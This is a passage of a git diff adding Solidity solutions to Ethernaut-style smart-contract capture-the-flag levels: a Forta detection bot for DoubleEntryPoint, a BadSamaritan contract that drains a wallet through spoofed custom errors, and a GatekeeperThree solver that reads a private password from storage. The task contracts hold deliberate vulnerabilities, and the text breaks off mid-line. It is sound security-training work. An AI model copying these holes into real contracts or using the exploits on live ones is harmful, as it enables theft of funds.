+[32m+[m[32m        if (data.length > 0) {[m
+[32m+[m[32m            (bool success,) = newImplementation.delegatecall(data);[m
+[32m+[m[32m            require(success, "Call failed");[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m[41m    [m
+[32m+[m[32m    // Stores a new address in the EIP1967 implementation slot.[m
+[32m+[m[32m    function _setImplementation(address newImplementation) private {[m
+[32m+[m[32m        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");[m
+[32m+[m[41m        [m
+[32m+[m[32m        AddressSlot storage r;[m
+[32m+[m[32m        assembly {[m
+[32m+[m[32m            r.slot := _IMPLEMENTATION_SLOT[m
+[32m+[m[32m        }[m
+[32m+[m[32m        r.value = newImplementation;[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+\ No newline at end of file[m
+[1mdiff --git a/src/26DoubleEntry/Solution.sol b/src/26DoubleEntry/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..b24bb4d[m
+[1m--- /dev/null[m
+[1m+++ b/src/26DoubleEntry/Solution.sol[m
+[36m@@ -0,0 +1,45 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32mimport "@openzeppelin/access/Ownable.sol";[m
+[32m+[m[32mimport "@openzeppelin/token/ERC20/ERC20.sol";[m
+[32m+[m[32mimport "./Task.sol";[m
+[32m+[m
+[32m+[m
+[32m+[m[32mcontract MyFortaBot is IDetectionBot {[m
+[32m+[m[32m    CryptoVault public cryptoVault;[m
+[32m+[m[32m    Forta public forta;[m
+[32m+[m
+[32m+[m[32m    constructor(address _vault, address _forta) {[m
+[32m+[m[32m        cryptoVault = CryptoVault(_vault);[m
+[32m+[m[32m        forta = Forta(_forta);[m
+[32m+[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function getSelector(bytes calldata msgData) public pure returns(bytes4 selector) {[m
+[32m+[m[32m        // assembly {[m
+[32m+[m[32m        // // load 32 bytes into `selector` from `data` skipping the first 32 bytes[m
+[32m+[m[32m        // selector := mload(add(msgData, 32))[m
+[32m+[m[32m        // }[m
+[32m+[m[32m        selector = bytes4(msgData[:4]);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function decodeMsgData(bytes calldata msgData) public pure returns (address to, uint value, address origSender) {[m
+[32m+[m[32m    // The first 4 bytes on the msgData are the function signature, in order to decode the payload it is required to skip those bytes of the function signature![m
+[32m+[m[32m        // reference: "abi.decode cannot decode msg.data" <===> https://github.com/ethereum/solidity/issues/6012[m
+[32m+[m[32m        (to, value, origSender) = abi.decode(msgData[4:],(address,uint,address));[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function handleTransaction(address user, bytes calldata msgData) external {[m
+[32m+[m[32m        bytes4 sweepTokenSelector = bytes4(keccak256("delegateTransfer(address,uint256,address)"));[m[41m [m
+[32m+[m[32m        if (sweepTokenSelector == getSelector(msgData)){[m
+[32m+[m[32m            (, , address origSender) = decodeMsgData(msgData);[m
+[32m+[m
+[32m+[m[32m            if (origSender == address(cryptoVault)) {[m
+[32m+[m[32m                forta.raiseAlert(user);[m
+[32m+[m[32m            }[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m
+[32m+[m[32m}[m
+\ No newline at end of file[m
+[1mdiff --git a/src/26DoubleEntry/Task.sol b/src/26DoubleEntry/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..8b8b9cd[m
+[1m--- /dev/null[m
+[1m+++ b/src/26DoubleEntry/Task.sol[m
+[36m@@ -0,0 +1,128 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32mimport "@openzeppelin/access/Ownable.sol";[m
+[32m+[m[32mimport "@openzeppelin/token/ERC20/ERC20.sol";[m
+[32m+[m
+[32m+[m[32minterface DelegateERC20 {[m
+[32m+[m[32m  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32minterface IDetectionBot {[m
+[32m+[m[32m    function handleTransaction(address user, bytes calldata msgData) external;[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32minterface IForta {[m
+[32m+[m[32m    function setDetectionBot(address detectionBotAddress) external;[m
+[32m+[m[32m    function notify(address user, bytes calldata msgData) external;[m
+[32m+[m[32m    function raiseAlert(address user) external;[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract Forta is IForta {[m
+[32m+[m[32m  mapping(address => IDetectionBot) public usersDetectionBots;[m
+[32m+[m[32m  mapping(address => uint256) public botRaisedAlerts;[m
+[32m+[m
+[32m+[m[32m  function setDetectionBot(address detectionBotAddress) external override {[m
+[32m+[m[32m      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);[m
+[32m+[m[32m  }[m
+[32m+[m
+[32m+[m[32m  function notify(address user, bytes calldata msgData) external override {[m
+[32m+[m[32m    if(address(usersDetectionBots[user]) == address(0)) return;[m
+[32m+[m[32m    try usersDetectionBots[user].handleTransaction(user, msgData) {[m
+[32m+[m[32m        return;[m
+[32m+[m[32m    } catch {}[m
+[32m+[m[32m  }[m
+[32m+[m
+[32m+[m[32m  function raiseAlert(address user) external override {[m
+[32m+[m[32m      if(address(usersDetectionBots[user]) != msg.sender) return;[m
+[32m+[m[32m      botRaisedAlerts[msg.sender] += 1;[m
+[32m+[m[32m  }[m[41m [m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract CryptoVault {[m
+[32m+[m[32m    address public sweptTokensRecipient;[m
+[32m+[m[32m    IERC20 public underlying;[m
+[32m+[m
+[32m+[m[32m    constructor(address recipient) {[m
+[32m+[m[32m        sweptTokensRecipient = recipient;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function setUnderlying(address latestToken) public {[m
+[32m+[m[32m        require(address(underlying) == address(0), "Already set");[m
+[32m+[m[32m        underlying = IERC20(latestToken);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    /*[m
+[32m+[m[32m    ...[m
+[32m+[m[32m    */[m
+[32m+[m
+[32m+[m[32m    function sweepToken(IERC20 token) public {[m
+[32m+[m[32m        require(token != underlying, "Can't transfer underlying token");[m
+[32m+[m[32m        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {[m
+[32m+[m[32m    DelegateERC20 public delegate;[m
+[32m+[m
+[32m+[m[32m    function mint(address to, uint256 amount) public onlyOwner {[m
+[32m+[m[32m        _mint(to, amount);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {[m
+[32m+[m[32m        delegate = newContract;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function transfer(address to, uint256 value) public override returns (bool) {[m
+[32m+[m[32m        if (address(delegate) == address(0)) {[m
+[32m+[m[32m            return super.transfer(to, value);[m
+[32m+[m[32m        } else {[m
+[32m+[m[32m            return delegate.delegateTransfer(to, value, msg.sender);[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {[m
+[32m+[m[32m    address public cryptoVault;[m
+[32m+[m[32m    address public player;[m
+[32m+[m[32m    address public delegatedFrom;[m
+[32m+[m[32m    Forta public forta;[m
+[32m+[m
+[32m+[m[32m    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {[m
+[32m+[m[32m        delegatedFrom = legacyToken;[m
+[32m+[m[32m        forta = Forta(fortaAddress);[m
+[32m+[m[32m        player = playerAddress;[m
+[32m+[m[32m        cryptoVault = vaultAddress;[m
+[32m+[m[32m        _mint(cryptoVault, 100 ether);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    modifier onlyDelegateFrom() {[m
+[32m+[m[32m        require(msg.sender == delegatedFrom, "Not legacy contract");[m
+[32m+[m[32m        _;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    modifier fortaNotify() {[m
+[32m+[m[32m        address detectionBot = address(forta.usersDetectionBots(player));[m
+[32m+[m
+[32m+[m[32m        // Cache old number of bot alerts[m
+[32m+[m[32m        uint256 previousValue = forta.botRaisedAlerts(detectionBot);[m
+[32m+[m
+[32m+[m[32m        // Notify Forta[m
+[32m+[m[32m        forta.notify(player, msg.data);[m
+[32m+[m
+[32m+[m[32m        // Continue execution[m
+[32m+[m[32m        _;[m
+[32m+[m
+[32m+[m[32m        // Check if alarms have been raised[m
+[32m+[m[32m        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function delegateTransfer(   //9cd1a121[m
+[32m+[m[32m        address to,   // 0000000000000000000000002cd71c554354781333019fcd78ddccc9cefc7f63   myAddr[m
+[32m+[m[32m        uint256 value,   // 0000000000000000000000000000000000000000000000056bc75e2d63100000  100[m
+[32m+[m[32m        address origSender  // 000000000000000000000000bd32b9903fcd2ce3fad987b11d177437bb8b55e2  vault[m
+[32m+[m[32m    ) public override onlyDelegateFrom fortaNotify returns (bool) {[m
+[32m+[m[32m        _transfer(origSender, to, value);[m
+[32m+[m[32m        return true;[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+\ No newline at end of file[m
+[1mdiff --git a/src/27GoodSamaritan/Solution.sol b/src/27GoodSamaritan/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..9439f71[m
+[1m--- /dev/null[m
+[1m+++ b/src/27GoodSamaritan/Solution.sol[m
+[36m@@ -0,0 +1,27 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity >=0.8.0 <0.9.0;[m
+[32m+[m
+[32m+[m[32mimport "@openzeppelin/utils/Address.sol";[m
+[32m+[m[32mimport "./Task.sol";[m
+[32m+[m
+[32m+[m[32mcontract BadSamaritan {[m
+[32m+[m
+[32m+[m[32m    GoodSamaritan public victim;[m
+[32m+[m
+[32m+[m[32m    error NotEnoughBalance();[m
+[32m+[m
+[32m+[m[32m    constructor(address _victim) {[m
+[32m+[m[32m        victim = GoodSamaritan(_victim);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function notify(uint256 amount) external pure {[m
+[32m+[m[32m        if (amount == 10) {[m
+[32m+[m[32m            revert NotEnoughBalance();[m
+[32m+[m[32m        }[m[41m        [m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function attackRequest() public {[m
+[32m+[m[32m        victim.requestDonation();[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+[1mdiff --git a/src/27GoodSamaritan/Task.sol b/src/27GoodSamaritan/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..7fe3b4f[m
+[1m--- /dev/null[m
+[1m+++ b/src/27GoodSamaritan/Task.sol[m
+[36m@@ -0,0 +1,103 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity >=0.8.0 <0.9.0;[m
+[32m+[m
+[32m+[m[32mimport "@openzeppelin/utils/Address.sol";[m
+[32m+[m
+[32m+[m[32mcontract GoodSamaritan {[m
+[32m+[m[32m    Wallet public wallet;[m
+[32m+[m[32m    Coin public coin;[m
+[32m+[m
+[32m+[m[32m    constructor() {[m
+[32m+[m[32m        wallet = new Wallet();[m
+[32m+[m[32m        coin = new Coin(address(wallet));[m
+[32m+[m
+[32m+[m[32m        wallet.setCoin(coin);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function requestDonation() external returns(bool enoughBalance){[m
+[32m+[m[32m        // donate 10 coins to requester[m
+[32m+[m[32m        try wallet.donate10(msg.sender) {[m
+[32m+[m[32m            return true;[m
+[32m+[m[32m        } catch (bytes memory err) {[m
+[32m+[m[32m            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {[m
+[32m+[m[32m                // send the coins left[m
+[32m+[m[32m                wallet.transferRemainder(msg.sender);[m
+[32m+[m[32m                return false;[m
+[32m+[m[32m            }[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract Coin {[m
+[32m+[m[32m    using Address for address;[m
+[32m+[m
+[32m+[m[32m    mapping(address => uint256) public balances;[m
+[32m+[m
+[32m+[m[32m    error InsufficientBalance(uint256 current, uint256 required);[m
+[32m+[m
+[32m+[m[32m    constructor(address wallet_) {[m
+[32m+[m[32m        // one million coins for Good Samaritan initially[m
+[32m+[m[32m        balances[wallet_] = 10**6;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function transfer(address dest_, uint256 amount_) external {[m
+[32m+[m[32m        uint256 currentBalance = balances[msg.sender];[m
+[32m+[m
+[32m+[m[32m        // transfer only occurs if balance is enough[m
+[32m+[m[32m        if(amount_ <= currentBalance) {[m
+[32m+[m[32m            balances[msg.sender] -= amount_;[m
+[32m+[m[32m            balances[dest_] += amount_;[m
+[32m+[m
+[32m+[m[32m            if(dest_.isContract()) {[m
+[32m+[m[32m                // notify contract[m[41m [m
+[32m+[m[32m                INotifyable(dest_).notify(amount_);[m
+[32m+[m[32m            }[m
+[32m+[m[32m        } else {[m
+[32m+[m[32m            revert InsufficientBalance(currentBalance, amount_);[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract Wallet {[m
+[32m+[m[32m    // The owner of the wallet instance[m
+[32m+[m[32m    address public owner;[m
+[32m+[m
+[32m+[m[32m    Coin public coin;[m
+[32m+[m
+[32m+[m[32m    error OnlyOwner();[m
+[32m+[m[32m    error NotEnoughBalance();[m
+[32m+[m
+[32m+[m[32m    modifier onlyOwner() {[m
+[32m+[m[32m        if(msg.sender != owner) {[m
+[32m+[m[32m            revert OnlyOwner();[m
+[32m+[m[32m        }[m
+[32m+[m[32m        _;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    constructor() {[m
+[32m+[m[32m        owner = msg.sender;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function donate10(address dest_) external onlyOwner {[m
+[32m+[m[32m        // check balance left[m
+[32m+[m[32m        if (coin.balances(address(this)) < 10) {[m
+[32m+[m[32m            revert NotEnoughBalance();[m
+[32m+[m[32m        } else {[m
+[32m+[m[32m            // donate 10 coins[m
+[32m+[m[32m            coin.transfer(dest_, 10);[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function transferRemainder(address dest_) external onlyOwner {[m
+[32m+[m[32m        // transfer balance left[m
+[32m+[m[32m        coin.transfer(dest_, coin.balances(address(this)));[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function setCoin(Coin coin_) external onlyOwner {[m
+[32m+[m[32m        coin = coin_;[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32minterface INotifyable {[m
+[32m+[m[32m    function notify(uint256 amount) external;[m
+[32m+[m[32m}[m
+\ No newline at end of file[m
+[1mdiff --git a/src/28GateKeeperThree/Solution.sol b/src/28GateKeeperThree/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..b9fec72[m
+[1m--- /dev/null[m
+[1m+++ b/src/28GateKeeperThree/Solution.sol[m
+[36m@@ -0,0 +1,36 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32mimport "./Task.sol";[m
+[32m+[m
+[32m+[m[32mcontract GateKeeprThreeSolution {[m
+[32m+[m[32m    GatekeeperThree public victim;[m
+[32m+[m
+[32m+[m[32m    constructor (address _victim) {[m
+[32m+[m[32m        victim = GatekeeperThree(payable(_victim));[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function gateOneSolution() public {[m
+[32m+[m[32m        victim.construct0r();[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function gateTwoSolution() public {[m
+[32m+[m[32m        // web3.eth.getStorageAt("0x32072f79e2D63FcA1427C502A6cbec38054B384C", 2, console.log)[m
+[32m+[m[32m        victim.getAllowance(0x00000000000000000000000000000000000000000000000000000000649068b4);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    //function gateThreeSolution() public[m[41m [m
+[32m+[m[32m    function send(uint amount) public pure returns (bool) {[m
+[32m+[m[32m        if (amount == 0.001 ether) {[m
+[32m+[m[32m            return false;[m
+[32m+[m[32m        } else {[m
+[32m+[m[32m            // do something[m
+[32m+[m[32m            return true;[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function openDoor() public {[m
+[32m+[m[32m        victim.enter();[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m}[m
+\ No newline at end of file[m
+[1mdiff --git a/src/28GateKeeperThree/Task.sol b/src/28GateKeeperThree/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..3355f14[m
+[1m--- /dev/null[m
+[1m+++ b/src/28GateKeeperThree/Task.sol[m
+[36m@@ -0,0 +1,76 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32mcontract SimpleTrick {[m
+[32m+[m[32m  GatekeeperThree public target;[m
+[32m+[m[32m  address public trick;[m
+[32m+[m[32m  uint private password = block.timestamp;[m
+[32m+[m
+[32m+[m[32m  constructor (address payable _target) {[m
+[32m+[m[32m    target = GatekeeperThree(_target);[m
+[32m+[m[32m  }[m
+[32m+[m[41m    [m
+[32m+[m[32m  function checkPassword(uint _password) public returns (bool) {[m
+[32m+[m[32m    if (_password == password) {[m
+[32m+[m[32m      return true;[m
+[32m+[m[32m    }[m
+[32m+[m[32m    password = block.timestamp;[m
+[32m+[m[32m    return false;[m
+[32m+[m[32m  }[m
+[32m+[m[41m    [m
+[32m+[m[32m  function trickInit() public {[m
+[32m+[m[32m    trick = address(this);[m
+[32m+[m[32m  }[m
+[32m+[m[41m    [m
+[32m+[m[32m  function trickyTrick() public {[m
+[32m+[m[32m    if (address(this) == msg.sender && address(this) != trick) {[m
+[32m+[m[32m      target.getAllowance(password);[m
+[32m+[m[32m    }[m
+[32m+[m[32m  }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract GatekeeperThree {[m
+[32m+[m[32m  address public owner;[m
+[32m+[m[32m  address public entrant;[m
+[32m+[m[32m  bool public allowEntrance;[m
+[32m+[m
+[32m+[m[32m  SimpleTrick public trick;[m
+[32m+[m
+[32m+[m[32m  function construct0r() public {[m
+[32m+[m[32m      owner = msg.sender;[m
+[32m+[m[32m  }[m
+[32m+[m
+[32m+[m[32m  modifier gateOne() {[m
+[32m+[m[32m    require(msg.sender == owner);[m
+[32m+[m[32m    require(tx.orig
